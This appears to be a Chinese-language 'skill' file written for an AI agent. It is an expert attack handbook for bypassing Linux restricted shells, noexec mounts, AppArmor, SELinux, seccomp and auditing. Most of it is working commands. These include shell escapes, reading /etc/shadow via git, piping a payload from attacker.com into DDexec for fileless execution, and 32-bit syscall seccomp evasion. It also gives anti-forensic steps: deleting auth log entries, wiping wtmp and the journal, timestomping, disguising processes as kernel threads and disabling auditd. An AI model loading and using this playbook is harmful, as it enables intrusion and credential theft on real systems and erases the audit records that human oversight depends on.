# 技能：Linux 安全绕过 — 专家攻击手册

> **AI 加载指令**：绕过 Linux 安全机制的高级技术。涵盖受限 shell 绕过、noexec 绕过、AppArmor/SELinux 绕过、seccomp 绕过和审计绕过。基础模型会遗漏 DDexec、memfd_create 无文件执行和架构混淆 seccomp 绕过。

## 0. 相关路由

在深入之前，考虑加载：

- [linux-权限提升](../linux-权限提升/SKILL.md) 一旦你突破限制并需要提升权限
- [容器逃逸技术](../容器逃逸技术/SKILL.md) 当安全机制是容器特定的（seccomp 配置文件、AppArmor docker-default）
- [linux-横向移动](../linux-横向移动/SKILL.md) 绕过限制后用于渗透
- [cmdi-命令注入](../cmdi-命令注入/SKILL.md) 当限制是来自 Web 应用上下文的命令执行

---

## 1. 受限的 BASH (rbash) 绕过

### 1.1 基于 SSH 的绕过

```bash
# 通过 SSH 强制使用不同的 shell
ssh user@host -t "bash --noprofile --norc"
ssh user@host -t "/bin/sh"
ssh user@host -t "bash -l"

# 如果 sshd_config 中设置了 ForceCommand，这些可能无效
# 尝试 SFTP/SCP —— 通常不受限制：
sftp user@host
# SFTP shell 有时可以执行命令
```

### 1.2 编辑器逃逸

```bash
# vi/vim 逃逸
vi
:set shell=/bin/bash
:shell
# 或：:!/bin/bash

# ed 逃逸
ed
!/bin/bash

# nano（如果可用）
# Ctrl+R → Ctrl+X → 命令执行
```

### 1.3 语言解释器逃逸

| 解释器 | 命令 |
|---|---|
| Python | `python3 -c 'import pty; pty.spawn("/bin/bash")'` |
| Perl | `perl -e 'exec "/bin/bash";'` |
| Ruby | `ruby -e 'exec "/bin/bash"'` |
| Lua | `lua -e 'os.execute("/bin/bash")'` |
| PHP | `php -r 'system("/bin/bash");'` |
| Node.js | `node -e 'require("child_process").spawn("/bin/bash",{stdio:[0,1,2]})'` |
| AWK | `awk 'BEGIN {system("/bin/bash")}'` |

### 1.4 环境变量技巧

```bash
# 通过 BASH_CMDS 重写 shell
BASH_CMDS[x]=/bin/bash
x

# 使用 env 启动不受限制的 shell
env /bin/bash
env -i /bin/bash

# PATH 操作（如果允许 export）
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
/bin/bash

# 如果只允许特定命令：
# 使用允许的命令读取文件
git log --oneline --all -p    # git 可以读取任意文件
git diff /dev/null /etc/shadow
```

### 1.5 其他逃逸方法

| 方法 | 命令 |
|---|---|
| `expect` | `expect -c 'spawn /bin/bash; interact'` |
| `script` | `script -qc /bin/bash /dev/null` |
| `rlwrap` | `rlwrap /bin/bash` |
| `nmap`（旧版） | `nmap --interactive` → `!bash` |

---

## 2. 只读 / noexec 文件系统执行

### 2.1 DDexec — 通过 /proc/self/mem 从 stdin 执行

```bash
# DDexec 通过覆盖运行进程的内存来执行新的二进制文件
# 没有写入磁盘的文件 — 完全无文件
# 使用方法：通过 DDexec 管道任意 ELF 二进制文件
curl -sL https://attacker.com/payload | bash ddexec.sh

# 工作原理：
# 1. 打开 /proc/self/mem 进行写入
# 2. 定位当前进程的文本段
# 3. 用目标 ELF 二进制文件覆盖它
# 4. 跳转到新的入口点
```

### 2.2 memfd_create — 内存文件描述符

```python
import ctypes, os
libc = ctypes.CDLL("libc.so.6")
fd = libc.syscall(319, b"", 0)     # SYS_MEMFD_CREATE (x86_64)
with open(f"/proc/self/fd/{fd}", "wb") as f:
    f.write(open("/path/to/binary", "rb").read())
os.execve(f"/proc/self/fd/{fd}", ["binary"], os.environ)   # 绕过 noexec
```

```bash
# Perl 变体：syscall(319, "", 0) → 写入 fd → exec /proc/$$/fd/$fd
```

### 2.3 ld.so 直接执行

```bash
# 使用动态链接器从可写挂载执行
# 即使二进制文件分区是 noexec，ld.so 从自己的挂载运行
/lib64/ld-linux-x86-64.so.2 /path/on/noexec/mount/binary

# 或从 /dev/shm（通常可写 + 执行）：
cp binary /dev/shm/binary
/dev/shm/binary
```

### 2.4 noexec 上的脚本解释器

```bash
# 脚本在 noexec 上仍然执行 — 只有 ELF 执行被阻止
# 解释器（python/perl/bash）在允许执行的挂载上运行
# 并将脚本作为数据读取

python3 /noexec/mount/exploit.py      # 有效
perl /noexec/mount/exploit.pl         # 有效
bash /noexec/mount/exploit.sh         # 有效
# 但 ./exploit（ELF 二进制文件）→ "Permission denied"
```

### 2.5 可写挂载点

```bash
# 常见的可写 + 执行能力位置：
/dev/shm        # tmpfs — 几乎总是可写 + 执行
/tmp            # 有时在硬化系统上 noexec
/var/tmp        # 通常可写
/run            # tmpfs — 检查权限

# 检查挂载选项：
mount | grep -E "shm|tmp"
# 查找 "noexec" 标志 — 如果不存在，执行被允许
```

---

## 3. AppArmor 绕过

### 3.1 配置文件枚举

```bash
# 检查 AppArmor 状态
aa-status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled     # Y = 启用
cat /sys/kernel/security/apparmor/profiles      # 列出所有配置文件

# 检查当前进程配置文件：
cat /proc/self/attr/current
# "unconfined" = 无限制
# "docker-default (enforce)" = Docker 的默认配置文件
```

### 3.2 利用策略

```bash
# 查找无限制进程（如果 root，通过 ptrace 注入）：
ps auxZ 2>/dev/null | grep unconfined

# 抱怨模式 = 实际上无限制（仅记录）：
aa-status | grep complain
```

常见的 AppArmor 配置文件漏洞：`/proc/self/fd/*` 访问、抽象 Unix 套接字、基于解释器的执行（python 脚本绕过二进制限制）和新建路径。

---

## 4. SELinux 绕过

### 4.1 模式检查

```bash
getenforce           # 强制 / 允许 / 禁用
sestatus             # 详细状态
cat /etc/selinux/config   # 持久化配置

# 检查当前上下文
id -Z
ps auxZ | head -20
```

### 4.2 允许域利用

```bash
semanage permissive -l 2>/dev/null    # 允许模式下配置文件
ps -eZ | grep -i permissive           # 进程 — 可以做任何事（仅记录）
```

### 4.3 上下文转换和布尔值

```bash
ls -Z /tmp/                           # 文件上下文 — tmp_t 有更广泛的访问权限
sesearch --allow -t unconfined_t 2>/dev/null | head -30   # 转换规则

# 危险的布尔值会削弱 SELinux：
getsebool -a | grep -i "on$" | grep -iE "exec|write|network|connect"
# httpd_can_network_connect, allow_execmem
```

---

## 5. SECCOMP 绕过

### 5.1 检查 Seccomp 状态

```bash
grep Seccomp /proc/self/status
# Seccomp: 0 = 禁用, 1 = 严格, 2 = 过滤

# Docker 默认 seccomp 配置文件阻止 ~44 系统调用
# 检查允许的内容：
./amicontained    # 显示阻止/允许的系统调用
```

### 5.2 架构混淆（x86 vs x86_64）

```bash
# Seccomp 过滤器通常只检查 x86_64 系统调用号
# x86（32 位）系统调用号不同！
# 如果过滤器不检查架构：

# 编译一个使用 x86 系统调用号的 32 位二进制文件：
# x86_64 execve = 59, x86 execve = 11
# 过滤器阻止系统调用 59 但不阻止 11

gcc -m32 -static -o exploit32 exploit.c
# 如果 seccomp 过滤器缺少 AUDIT_ARCH_X86 检查 → 绕过
```

### 5.3 允许的系统调用滥用和内核漏洞

允许的系统调用创意滥用：`sendmsg/recvmsg`（在进程间传递文件描述符）、`mmap/mprotect`（可执行内存）、`process_vm_readv/writev`（跨进程内存）。

已知的 seccomp 内核漏洞：CVE-2019-2054（ptrace 绕过），io_uring 完全绕过 seccomp（5.12 之前）。检查 `uname -r` 并对比。

---

## 6. 审计绕过

### 6.1 时间戳操作

```bash
# 修改文件时间戳以隐藏更改
touch -r /etc/hosts /modified/file          # 从参考文件复制时间戳
touch -t 202301010000.00 /modified/file     # 设置特定时间戳

# 修改日志时间戳（如果可写）
# 使用 timestomping 匹配周围条目
```

### 6.2 日志篡改和进程伪装

```bash
sed -i '/pattern/d' /var/log/auth.log     # 删除特定条目
echo "" > /var/log/wtmp                    # 清除登录记录
journalctl --rotate && journalctl --vacuum-time=1s   # 清除 journal

# 进程名伪装（隐藏在 ps 输出中）：
exec -a "[kworker/0:0]" /bin/bash          # Bash
# C/Python: prctl(PR_SET_NAME, "kworker/0:0", 0, 0, 0)

# root 访问？禁用审计：
auditctl -e 0 && service auditd stop
```

---

## 7. Linux 安全绕过决策树

```
识别了安全机制？
│
├── 受限 shell (rbash)？
│   ├── SSH 访问？ → ssh -t "bash --noprofile --norc" (§1.1)
│   ├── 可用编辑器？ → vi :!/bin/bash (§1.2)
│   ├── 语言解释器？ → python/perl/ruby 逃逸 (§1.3)
│   ├── env 命令？ → env /bin/bash (§1.4)
│   └── 允许的命令带逃逸？ → git/man/less → !bash (§1.5)
│
├── noexec 文件系统？
│   ├── 脚本解释器可用？ → bash/python/perl 脚本有效 (§2.4)
│   ├── /dev/shm 可写 + 执行？ → 将二进制文件复制到那里 (§2.5)
│   ├── memfd_create 可用？ → 无文件执行 (§2.2)
│   ├── ld.so 可访问？ → ld.so /path/to/binary (§2.3)
│   └── 最后手段 → DDexec 通过 /proc/self/mem (§2.1)
│
├── AppArmor 强制？
│   ├── 配置文件在抱怨模式？ → 无限制，仅记录 (§3.3)
│   ├── 存在无限制进程？ → 注入/迁移到它们 (§3.2)
│   ├── 配置文件缺少路径覆盖？ → 使用未覆盖的路径 (§3.4)
│   └── 解释器未限制？ → 脚本执行
│
├── SELinux 强制？
│   ├── 域设置为允许？ → 利用该域 (§4.2)
│   ├── 启用危险布尔值？ → 滥用允许的操作 (§4.4)
│   ├── 上下文转换可用？ → 使用转换执行二进制文件 (§4.3)
│   └── 内核 CVE？ → SELinux 绕过漏洞利用
│
├── seccomp 过滤器激活？
│   ├── 架构检查缺失？ → 32 位系统调用混淆 (§5.2)
│   ├── 允许的系统调用可滥用？ → sendmsg/mmap 滥用 (§5.3)
│   ├── 内核漏洞？ → io_uring/ptrace 绕过 (§5.4)
│   └── 检查被阻止的内容 → amicontained (§5.1)
│
└── 审计记录？
    ├── 可写日志？ → 删除/修改条目 (§6.2)
    ├── root 访问？ → 禁用 auditd (§6.4)
    ├── 需要隐蔽？ → 进程名伪装 (§6.3)
    └── 文件更改被跟踪？ → 时间戳操作 (§6.1)
```
